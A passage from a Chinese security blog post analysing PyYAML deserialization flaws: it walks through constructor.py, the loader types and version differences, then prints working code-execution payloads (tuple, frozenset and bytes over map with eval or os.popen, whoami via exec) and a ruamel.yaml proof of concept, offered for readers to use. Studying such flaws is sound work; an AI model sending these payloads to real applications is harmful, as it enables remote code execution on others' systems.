        //这里查看是不是在sys.moudles字典里，不是就会进入直接报错
        <span class="hljs-keyword">if</span> module_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sys.modules:
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"module %r is not imported"</span> % module_name.encode(<span class="hljs-string">'utf-8'</span>), mark)
        module = sys.modules[module_name]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(module, object_name):
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"cannot find %r in the module %r"</span> % (object_name.encode(<span class="hljs-string">'utf-8'</span>),
                        module.__name__), mark)
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, object_name)</code></pre>
<p>接下来执行这一段</p>
<pre><code class="hljs py"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>(self.classobj))):
          <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python instance"</span>, node.start_mark,
                  <span class="hljs-string">"expected a class, but found %r"</span> % <span class="hljs-built_in">type</span>(cls),
                  node.start_mark)</code></pre>
<h2 id="pyyamlgt51">PyYaml&gt;5.1</h2>
<p>在Python的PyYaml库中提供以下方法将python和yaml进行语言格式转换：</p>
<p><strong>load()</strong></p>
<p>在PyYaml&gt;5.1的版本之后，如果要使用load()函数，要跟上一个Loader的参数，否则会报错。(不影响正常输出)</p>
<p>tips：真尴尬，感情我上面分析了半天，用的都是&gt;5.1的版本。。。。但竟然能复现成？？</p>
<p>这里其实和PyYaml&lt;=5.1版本一样，就不多赘述。</p>
<pre><code class="hljs scss"><span class="hljs-built_in">load</span>(data, Loader=yaml.Loader)</code></pre>
<p>这里说明一下PyYaml&gt;5.1都有哪些加载器</p>
<pre><code class="hljs scss">BaseLoader：不支持强制类型转换
SafeLoader：安全地加载 YAML 格式的数据，限制被加载的 YAML 数据中可用的 Python 对象类型，从而防止执行危险的操作或代码。
FullLoader：加载包含任意 Python 对象的 YAML 数据，FullLoader 加载器不会限制被加载的 YAML 数据中可用的 Python 对象类型，因此可以加载包含任意 Python 对象的 YAML 数据。
UnsafeLoader：加载包含任意 Python 对象的 YAML 数据，并且不会对被加载的 YAML 数据中可用的 Python 对象类型进行任何限制。</code></pre>
<p>以SafeLoader为例，示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

<span class="hljs-keyword">def</span> <span class="hljs-title function_">person_constructor</span>(<span class="hljs-params">loader, node</span>):
    fields = loader.construct_mapping(node, deep=<span class="hljs-literal">True</span>)
    <span class="hljs-keyword">return</span> Person(**fields)

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Bob</span>
<span class="hljs-string">  age: 30</span>
<span class="hljs-string">"""</span>

yaml.SafeLoader.add_constructor(<span class="hljs-string">'tag:yaml.org,2002:python/object:__main__.Person'</span>, person_constructor)

data = yaml.load(yaml_data, Loader=yaml.SafeLoader)

<span class="hljs-keyword">for</span> person <span class="hljs-keyword">in</span> data:
    <span class="hljs-built_in">print</span>(person.name, person.age)</code></pre>
<p><strong>load_all(data, Loader=yaml.Loader)</strong></p>
<p>以SafeLoader加载器为例，示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

<span class="hljs-keyword">def</span> <span class="hljs-title function_">person_constructor</span>(<span class="hljs-params">loader, node</span>):
    fields = loader.construct_mapping(node, deep=<span class="hljs-literal">True</span>)
    <span class="hljs-keyword">return</span> Person(**fields)

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string"># 第一个文档</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string"></span>
<span class="hljs-string"># 第二个文档</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Bob</span>
<span class="hljs-string">  age: 30</span>
<span class="hljs-string">"""</span>

yaml.SafeLoader.add_constructor(<span class="hljs-string">'tag:yaml.org,2002:python/object:__main__.Person'</span>, person_constructor)

data = yaml.load_all(yaml_data, Loader=yaml.SafeLoader)

<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> data:
    <span class="hljs-keyword">for</span> person <span class="hljs-keyword">in</span> doc:
        <span class="hljs-built_in">print</span>(person.name, person.age)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss">Alice <span class="hljs-number">25</span>
Bob <span class="hljs-number">30</span></code></pre>
<p>这里其实和load(data, Loader=yaml.Loader)函数一样，就不多赘述了。</p>
<p><strong>full_load(data)</strong></p>
<p>load()与full_load()函数的区别是，full_load()使用<strong>SafeLoader</strong>作为默认解析器。所以说，这是一个相对安全的解析器，它限制了可以执行的Python代码的类型。</p>
<p>示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- foo</span>
<span class="hljs-string">- bar</span>
<span class="hljs-string">- baz</span>
<span class="hljs-string">"""</span>

data = yaml.full_load(yaml_data)

<span class="hljs-built_in">print</span>(data)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[<span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>, <span class="hljs-string">'baz'</span>]</span></code></pre>
<p><strong>full_load_all(data)</strong></p>
<p>full_load_all()与full_load()函数类似，但可以处理包含多个YAML文档的数据流。</p>
<p>示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- foo</span>
<span class="hljs-string">- bar</span>
<span class="hljs-string">- baz</span>
<span class="hljs-string">---</span>
<span class="hljs-string">- alice</span>
<span class="hljs-string">- bob</span>
<span class="hljs-string">- charlie</span>
<span class="hljs-string">"""</span>

data = yaml.full_load_all(yaml_data)

<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> data:
    <span class="hljs-built_in">print</span>(doc)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[<span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>, <span class="hljs-string">'baz'</span>]</span>
<span class="hljs-selector-attr">[<span class="hljs-string">'alice'</span>, <span class="hljs-string">'bob'</span>, <span class="hljs-string">'charlie'</span>]</span></code></pre>
<p><strong>unsafe_load(data)</strong></p>
<p>unsafe_load()函数可以加载包含自定义Python对象的YAML数据，允许加载和执行任意Python代码，并尝试将它们反序列化为实际的Python对象（存在安全隐患）</p>
<p>示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">!!python/object:__main__.Person</span>
<span class="hljs-string">name: Alice</span>
<span class="hljs-string">age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

data = yaml.unsafe_load(yaml_data)

<span class="hljs-built_in">print</span>(data)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss">&lt;__main__<span class="hljs-selector-class">.Person</span> <span class="hljs-selector-tag">object</span> at <span class="hljs-number">0</span>x0000022DA0D36CD0&gt;</code></pre>
<p><strong>unsafe_load_all(data)</strong></p>
<p>相比unsafe_load()，unsafe_load_all()用于将多个YAML文档加载为Python对象的生成器。</p>
<p>示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- foo</span>
<span class="hljs-string">- bar</span>
<span class="hljs-string">- baz</span>
<span class="hljs-string">---</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

data = yaml.unsafe_load_all(yaml_data)

<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> data:
    <span class="hljs-built_in">print</span>(doc)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[<span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>, <span class="hljs-string">'baz'</span>]</span>
<span class="hljs-selector-attr">[&lt;__main__.Person object at 0x00000174FFEBD210&gt;]</span></code></pre>
<h3 id="漏洞成因">漏洞成因</h3>
<p>这里的漏洞成因和PyYaml&lt;=5.1一样，都是constructor.py中的一些不严谨的代码引起的漏洞。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>我这里选用测试的PyYaml版本是5.1.1版本。</p>
<p>在PyYaml&gt;5.1的版本之后，Fullloader这个加载器对于payload的限制比较多了，我们延用PyYaml的poc还是可以的，只不过要修改一下。</p>
<p>我们还可以利用python内置的builtins模块(因为之前我们审计constructor.py时，发现定义的find_python_name()中，如果不用"."将模块名和对象名分开，会默认调用builtins模块)</p>
<h3 id="pyyamllt51的poc">PyYaml&lt;=5.1的poc</h3>
<pre><code class="hljs scss">from yaml import *
poc= <span class="hljs-selector-tag">b</span>"""!!python/<span class="hljs-selector-tag">object</span>/apply:os.system
- calc<span class="hljs-string">""</span><span class="hljs-string">"</span>
<span class="hljs-string">#subprocess.check_output</span>
<span class="hljs-string">#os.popen</span>
<span class="hljs-string">#subprocess.run</span>
<span class="hljs-string">#subprocess.call</span>
<span class="hljs-string">#subprocess.Popen</span>
<span class="hljs-string"></span>
<span class="hljs-string">yaml.load(poc,Loader=Loader)</span></code></pre>
<h3 id="builtins模块中的内置函数">builtins模块中的内置函数</h3>
<p><code>builtins</code>是python的内建模块，所谓内建模块就是你在使用时不需要<code>import</code>，在python启动后，在没有执行程序员编写的任何代码前，python会加载内建模块中的函数到内存中。</p>
<p>发现在<code>find_python_name</code>处理不带<code>.</code>，也就是module为空的情况下，自动默认module为<code>builtins</code>，并且该模块是在<code>sys.modules</code>中的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323205827050.png" alt="image-20240323205827050"></p>
<p>首先，我们先明确builtins中的所有的类，从而筛选出可以利用的类</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> builtins

builtin_classes = []
<span class="hljs-keyword">for</span> obj_name <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(builtins):
    obj = <span class="hljs-built_in">getattr</span>(builtins, obj_name)
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(obj, <span class="hljs-built_in">type</span>):
        builtin_classes.append(obj)

<span class="hljs-built_in">print</span>(builtin_classes)</code></pre>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[&lt;class <span class="hljs-string">'ArithmeticError'</span>&gt;, &lt;class <span class="hljs-string">'AssertionError'</span>&gt;, &lt;class <span class="hljs-string">'AttributeError'</span>&gt;, &lt;class <span class="hljs-string">'BaseException'</span>&gt;, &lt;class <span class="hljs-string">'BlockingIOError'</span>&gt;, &lt;class <span class="hljs-string">'BrokenPipeError'</span>&gt;, &lt;class <span class="hljs-string">'BufferError'</span>&gt;, &lt;class <span class="hljs-string">'BytesWarning'</span>&gt;, &lt;class <span class="hljs-string">'ChildProcessError'</span>&gt;, &lt;class <span class="hljs-string">'ConnectionAbortedError'</span>&gt;, &lt;class <span class="hljs-string">'ConnectionError'</span>&gt;, &lt;class <span class="hljs-string">'ConnectionRefusedError'</span>&gt;, &lt;class <span class="hljs-string">'ConnectionResetError'</span>&gt;, &lt;class <span class="hljs-string">'DeprecationWarning'</span>&gt;, &lt;class <span class="hljs-string">'EOFError'</span>&gt;, &lt;class <span class="hljs-string">'OSError'</span>&gt;, &lt;class <span class="hljs-string">'Exception'</span>&gt;, &lt;class <span class="hljs-string">'FileExistsError'</span>&gt;, &lt;class <span class="hljs-string">'FileNotFoundError'</span>&gt;, &lt;class <span class="hljs-string">'FloatingPointError'</span>&gt;, &lt;class <span class="hljs-string">'FutureWarning'</span>&gt;, &lt;class <span class="hljs-string">'GeneratorExit'</span>&gt;, &lt;class <span class="hljs-string">'OSError'</span>&gt;, &lt;class <span class="hljs-string">'ImportError'</span>&gt;, &lt;class <span class="hljs-string">'ImportWarning'</span>&gt;, &lt;class <span class="hljs-string">'IndentationError'</span>&gt;, &lt;class <span class="hljs-string">'IndexError'</span>&gt;, &lt;class <span class="hljs-string">'InterruptedError'</span>&gt;, &lt;class <span class="hljs-string">'IsADirectoryError'</span>&gt;, &lt;class <span class="hljs-string">'KeyError'</span>&gt;, &lt;class <span class="hljs-string">'KeyboardInterrupt'</span>&gt;, &lt;class <span class="hljs-string">'LookupError'</span>&gt;, &lt;class <span class="hljs-string">'MemoryError'</span>&gt;, &lt;class <span class="hljs-string">'ModuleNotFoundError'</span>&gt;, &lt;class <span class="hljs-string">'NameError'</span>&gt;, &lt;class <span class="hljs-string">'NotADirectoryError'</span>&gt;, &lt;class <span class="hljs-string">'NotImplementedError'</span>&gt;, &lt;class <span class="hljs-string">'OSError'</span>&gt;, &lt;class <span class="hljs-string">'OverflowError'</span>&gt;, &lt;class <span class="hljs-string">'PendingDeprecationWarning'</span>&gt;, &lt;class <span class="hljs-string">'PermissionError'</span>&gt;, &lt;class <span class="hljs-string">'ProcessLookupError'</span>&gt;, &lt;class <span class="hljs-string">'RecursionError'</span>&gt;, &lt;class <span class="hljs-string">'ReferenceError'</span>&gt;, &lt;class <span class="hljs-string">'ResourceWarning'</span>&gt;, &lt;class <span class="hljs-string">'RuntimeError'</span>&gt;, &lt;class <span class="hljs-string">'RuntimeWarning'</span>&gt;, &lt;class <span class="hljs-string">'StopAsyncIteration'</span>&gt;, &lt;class <span class="hljs-string">'StopIteration'</span>&gt;, &lt;class <span class="hljs-string">'SyntaxError'</span>&gt;, &lt;class <span class="hljs-string">'SyntaxWarning'</span>&gt;, &lt;class <span class="hljs-string">'SystemError'</span>&gt;, &lt;class <span class="hljs-string">'SystemExit'</span>&gt;, &lt;class <span class="hljs-string">'TabError'</span>&gt;, &lt;class <span class="hljs-string">'TimeoutError'</span>&gt;, &lt;class <span class="hljs-string">'TypeError'</span>&gt;, &lt;class <span class="hljs-string">'UnboundLocalError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeDecodeError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeEncodeError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeTranslateError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeWarning'</span>&gt;, &lt;class <span class="hljs-string">'UserWarning'</span>&gt;, &lt;class <span class="hljs-string">'ValueError'</span>&gt;, &lt;class <span class="hljs-string">'Warning'</span>&gt;, &lt;class <span class="hljs-string">'OSError'</span>&gt;, &lt;class <span class="hljs-string">'ZeroDivisionError'</span>&gt;, &lt;class <span class="hljs-string">'_frozen_importlib.BuiltinImporter'</span>&gt;, &lt;class <span class="hljs-string">'bool'</span>&gt;, &lt;class <span class="hljs-string">'bytearray'</span>&gt;, &lt;class <span class="hljs-string">'bytes'</span>&gt;, &lt;class <span class="hljs-string">'classmethod'</span>&gt;, &lt;class <span class="hljs-string">'complex'</span>&gt;, &lt;class <span class="hljs-string">'dict'</span>&gt;, &lt;class <span class="hljs-string">'enumerate'</span>&gt;, &lt;class <span class="hljs-string">'filter'</span>&gt;, &lt;class <span class="hljs-string">'float'</span>&gt;, &lt;class <span class="hljs-string">'frozenset'</span>&gt;, &lt;class <span class="hljs-string">'int'</span>&gt;, &lt;class <span class="hljs-string">'list'</span>&gt;, &lt;class <span class="hljs-string">'map'</span>&gt;, &lt;class <span class="hljs-string">'memoryview'</span>&gt;, &lt;class <span class="hljs-string">'object'</span>&gt;, &lt;class <span class="hljs-string">'property'</span>&gt;, &lt;class <span class="hljs-string">'range'</span>&gt;, &lt;class <span class="hljs-string">'reversed'</span>&gt;, &lt;class <span class="hljs-string">'set'</span>&gt;, &lt;class <span class="hljs-string">'slice'</span>&gt;, &lt;class <span class="hljs-string">'staticmethod'</span>&gt;, &lt;class <span class="hljs-string">'str'</span>&gt;, &lt;class <span class="hljs-string">'super'</span>&gt;, &lt;class <span class="hljs-string">'tuple'</span>&gt;, &lt;class <span class="hljs-string">'type'</span>&gt;, &lt;class <span class="hljs-string">'zip'</span>&gt;]</span></code></pre>
<p>现在就是找可以利用的类了，继续回到我们的constructor.py中，进一步审计 construct_python_object_apply()时，发现了一个漏洞点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323210251975.png" alt="image-20240323210251975"></p>
<p>如果listitems不为空，则调用instance的extend()方法，将listitems中的所有元素添加到instance列表对象的末尾，instance是我们创建的实例，这里并没有定义listitems是什么，如果我们的listitems是一个字典，而且其内容有"{‘extend’:function}"，这样的话，我们就可以利用extend进行任意函数的执行了。</p>
<p>但是，经过测试，发现上面builtins中的这些类中，只有frozenset，bytes，tuple这三个类可以进行命令执行，为了搞清楚为什么，我们继续审计源码。</p>
<p>我们接着看make_python_instance()，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323210433928.png" alt="image-20240323210433928"></p>
<p>这里只要我们的内置类可以执行<code>cls.__new__(cls, *args, **kwds)</code>这段代码，就可以根据参数来动态创建新的Python对象，从而进行命令执行。</p>
<p>所以猜测frozenset，bytes，tuple应该是可以执行上述代码，所以可以进行命令执行的</p>
<h4 id="payload">payload</h4>
<pre><code class="hljs scss">!!python/<span class="hljs-selector-tag">object</span>/new:bytes  
        - !!python/object/new:map  
          - !!python/name:eval  
          - [<span class="hljs-string">"__import__\x28'pickle'\x29.load\x28open\x28'fileinfo/pik','rb'\x29\x29"</span>]
          
          
!!python/object/new:frozenset  
- !!python/object/new:map  
  - !!python/name:os.popen  
  - [<span class="hljs-string">"bash /app/fileinfo/cmd"</span>]
  
  
!!python/object/new:tuple  
        - !!python/object/new:map  
          - !!python/name:eval  
          - [<span class="hljs-string">"print(123)"</span>]</code></pre>
<p>发现都是有回显的，这里顺便附上一些文章找到的payload，供大家使用:</p>
<pre><code class="hljs scss">#报错但是执行了
- !!python/<span class="hljs-selector-tag">object</span>/new:str
    args: []
    state: !!python/tuple
    - <span class="hljs-string">"__import__('os').system('whoami')"</span>
    - !!python/object/new:staticmethod
      args: [<span class="hljs-number">0</span>]
      state:
        update: !!python/name:exec
        
        
- !!python/object/new:yaml.MappingNode
  listitems: !!str <span class="hljs-string">'!!python/object/apply:subprocess.Popen [whoami]'</span>
  state:
    tag: !!str dummy
    value: !!str dummy
    extend: !!python/name:yaml.unsafe_load
    
    
#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数
!!python/object/new:type
  args: [<span class="hljs-string">"z"</span>, !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: <span class="hljs-string">"__import__('os').system('whoami')"</span></code></pre>
<p>我们可以用python的内置函数<code>eval</code>（或者<code>exec</code>）来执行代码，用<code>map</code>来触发函数执行，用<code>tuple</code>将map对象转化为元组输出来（当然用<code>list</code>、<code>frozenset</code>、<code>bytes</code>都可以），用python写出来如下</p>
<pre><code class="hljs python"><span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">"__import__('os').system('whoami')"</span>]))</code></pre>
<p>变为yaml</p>
<pre><code class="hljs yaml"><span class="hljs-string">yaml.load("""</span>
<span class="hljs-type">!!python/object/new:tuple</span>
<span class="hljs-bullet">-</span> <span class="hljs-type">!!python/object/new:map</span>
  <span class="hljs-bullet">-</span> <span class="hljs-type">!!python/name:eval</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-string">"__import__('os').system('whoami')"</span>]
<span class="hljs-string">""</span><span class="hljs-string">")</span></code></pre>
<p>PS:</p>
<blockquote>
<blockquote>
<p>当利用上述payload测试到5.2b1版本时，发现无法利用针对!!python/object/apply标签的payload了，别的都可以利用</p>
<p>上述payload当我测试到5.4b1版本时，发现只有利用<code>针对!!python/name标签</code>的payload可以命令执行，别的payload都不能用了</p>
</blockquote>
<p>一些高版本的绕过方式，由于不是很常见，这里就不多介绍了</p>
</blockquote>
<p>当版本大于等于5.3.1:<a target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/pull/386">Prevents arbitrary code execution during python/object/new constructor by ret2libc · Pull Request #386 · yaml/pyyaml · GitHub</a></p>
<p>当版本大于等于6.0:<a target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/pull/386">Prevents arbitrary code execution during python/object/new constructor by ret2libc · Pull Request #386 · yaml/pyyaml · GitHub</a></p>
<h2 id="利用ruamelyaml读写yaml文件">利用ruamel.yaml读写yaml文件</h2>
<p>在网上搜资料的时候，发现了也可以利用ruamel.yaml读写yaml文件，所以我在想，是不是也存在PyYaml反序列化漏洞，进行测试一下。</p>
<p>这里还是沿用PyYaml&gt;5.1的poc</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> ruamel.yaml

poc= <span class="hljs-string">b"""!!python/object/apply:os.system</span>
<span class="hljs-string">- calc"""</span>

ruamel.yaml.load(poc)<span class="hljs-comment">#py2下运行</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323213632644.png" alt="image-20240323213632644"></p>
<h1 id="0x05-参考文章">0x05 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/damoxilai/p/16707055.html">PyYAML反序列化漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7923?time__1311=n4%2BxnD0G0%3DeQwqmTe05%2Bb8e4D5i%3DrzD9YbDYwD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-5">浅谈PyYAML反序列化漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12481?time__1311=mqmhD5AKYIeUhDBqDTCgFTH%2BQ8D8IYeD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6">PyYaml反序列化漏洞详解</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonname">SecMap - 反序列化（PyYAML） </a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/')">PyYmal反序列化</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=PyYmal反序列化&amp;url=http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>基本知识<span class="tagsPageCount">21</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/23/metasploit-xue-xi/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Metasploit学习</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/24/metasploit-xue-xi-2/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Metasploit学习2</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/07/27/ajax-xiang-jie/" title="Ajax详解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-07-27</div><div class="title">Ajax详解</div></div></a></div><div><a href="/2023/08/06/docker-jian-jie/" title="docker基础"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont 